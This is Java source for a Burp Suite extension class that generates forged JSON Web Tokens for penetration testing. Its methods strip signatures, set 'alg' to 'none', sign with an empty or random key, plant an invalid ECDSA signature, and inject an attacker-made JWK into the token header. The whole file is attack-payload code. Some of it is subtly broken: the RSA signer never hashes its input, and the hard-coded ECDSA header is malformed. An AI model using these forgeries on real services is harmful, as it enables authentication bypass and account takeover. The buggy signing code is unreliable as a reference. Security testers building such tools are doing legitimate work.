package BurpExtension;
import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import burp.api.montoya.MontoyaApi;

import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Base64;
import java.util.Map;

import org.json.*;

public class JwtModifier {
    private final MontoyaApi api;
    private final SecretKey dummyKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);
    JwtModifier (MontoyaApi api){
        this.api = api;
    }

    private static String decodeBase64Url(String base64Url) {
        Base64.Decoder decoder = Base64.getUrlDecoder();
        byte[] decodedBytes = decoder.decode(base64Url);
        return new String(decodedBytes, StandardCharsets.UTF_8);
    }

    private static String encodeBase64Url(String input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes(StandardCharsets.UTF_8));
    }

    private static String encodeBase64UrlByte(byte[] input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input);
    }

    public boolean isJwtNotExpired(String jwt) {
        String[] jwtParts = jwt.split("\\.");
        String payload = jwtParts[1];
        String decodedClaim = decodeBase64Url(payload);
        JSONObject claim = new JSONObject(decodedClaim);
        long expValue = claim.getLong("exp");
        long currentTime = System.currentTimeMillis()/1000;
        return expValue > currentTime;
    }

    public String removeSignature(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String header = jwtParts[0];
        String claims = jwtParts[1];

        String concatenated = header + '.' + claims;
        return concatenated;
    }

    public String wrongSignature(String jwt){
        String[] jwtParts = jwt.split("\\.");
        return createJwtFromString(jwtParts[0], jwtParts[1], dummyKey.toString());
    }

    public String algNone(String jwt) {
        String[] jwtParts = jwt.split("\\.");
        JSONObject header = new JSONObject(decodeBase64Url(jwtParts[0]));

        header.put("alg", "none");
        return encodeBase64Url(header.toString()) + '.' + jwtParts[1] + '.';
    }

    public String emptyPassword(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String combined = jwtParts[0] + '.' + jwtParts[1];
        return combined + '.' + createHmacSha256EmptySignature(combined);
    }

    public String invalidEcdsa(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String header = "ezJ0eXAiOiJKV1QiLCJhbGciOiJFUyI1NiJ9";
        api.logging().logToOutput("ECDSA header :" + decodeBase64Url(header));
        String claim = jwtParts[1];
        String signature = "MAZCAQACAQA";
        return header + '.' + claim + '.' + signature;
    }

    public String JwksInjection(String jwt){
        String[] jwtParts = jwt.split("\\.");

        try {
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
            keyPairGenerator.initialize(2048);
            KeyPair keyPair = keyPairGenerator.generateKeyPair();

            RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
            RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();

            BigInteger modulus = publicKey.getModulus();
            BigInteger publicExponent = publicKey.getPublicExponent();

            String n = Base64.getUrlEncoder().withoutPadding().encodeToString(modulus.toByteArray());
            String e = Base64.getUrlEncoder().withoutPadding().encodeToString(publicExponent.toByteArray());
            JSONObject header = new JSONObject();
            JSONObject jwk = new JSONObject();
            jwk.put("kty", "RSA");
            jwk.put("kid","jwt-attacker");
            jwk.put("use", "sig");
            jwk.put("e", e);
            jwk.put("n",n);

            header.put("typ", "JWT");
            header.put("alg","RS256");
            header.put("jwk",jwk);

            String combined = encodeBase64Url(header.toString()) + '.' + jwtParts[1];
            api.logging().logToOutput("combined: " + combined);
            api.logging().logToOutput("JWK " + jwk.toString());
            api.logging().logToOutput("return value \n" + combined + '.' + createSha256WithRsaSignature(combined, privateKey));
            return combined + '.' + createSha256WithRsaSignature(combined, privateKey);
        } catch (Exception e) {
            api.logging().logToError("Error while creating RSA key pair: " + e.getMessage());
        }

        return null;
    }

    private String createJwtFromString(String header, String claim, String key) {
        /* JWS Signing Input (RFC)
        The input to the digital signature or MAC computation.  Its value
        is ASCII(BASE64URL(UTF8(JWS Protected Header)) || '.' ||
        BASE64URL(JWS Payload)). */

        // Check if header and claim are already encoded.
        if (!header.startsWith("ey")) {
            header = encodeBase64Url(header);
            String encodedClaim = encodeBase64Url(claim);
        }
        if (!claim.startsWith("ey")) {
            claim = encodeBase64Url(claim);
        }

        String combined = header + "." + claim;
        String signature = createHmacSha256Signature(combined, key);
        return combined + "." + signature;
    }

    private String createHmacSha256Signature(String input, String secret) {
        SecretKeySpec secretKeySpec = new SecretKeySpec(secret.getBytes(), "HmacSHA256");
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(secretKeySpec);

            byte[] hmacBytes = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return encodeBase64UrlByte(hmacBytes);

        } catch (Exception e) {
            api.logging().logToError(e.getMessage());
            return input;
        }
    }

    private String createHmacSha256EmptySignature(String input) {
        EmptySecret emptySecret = new EmptySecret();
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(emptySecret);

            byte[] hmacBytes = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return encodeBase64UrlByte(hmacBytes);

        } catch (Exception e) {
            api.logging().logToError(e.getMessage());
            return input;
        }
    }

    private String createSha256WithRsaSignature(String input, RSAPrivateKey privateKey){
        try {
            Signature signature = Signature.getInstance("SHA256withRSA");
            signature.initSign(privateKey);
            byte[] signedData = signature.sign();
            return encodeBase64UrlByte(signedData);

        } catch (Exception e) {
            api.logging().logToError("An error occured during SHA256 RSA signature calculation: " + e.getMessage());
            return null;
        }
    }
}
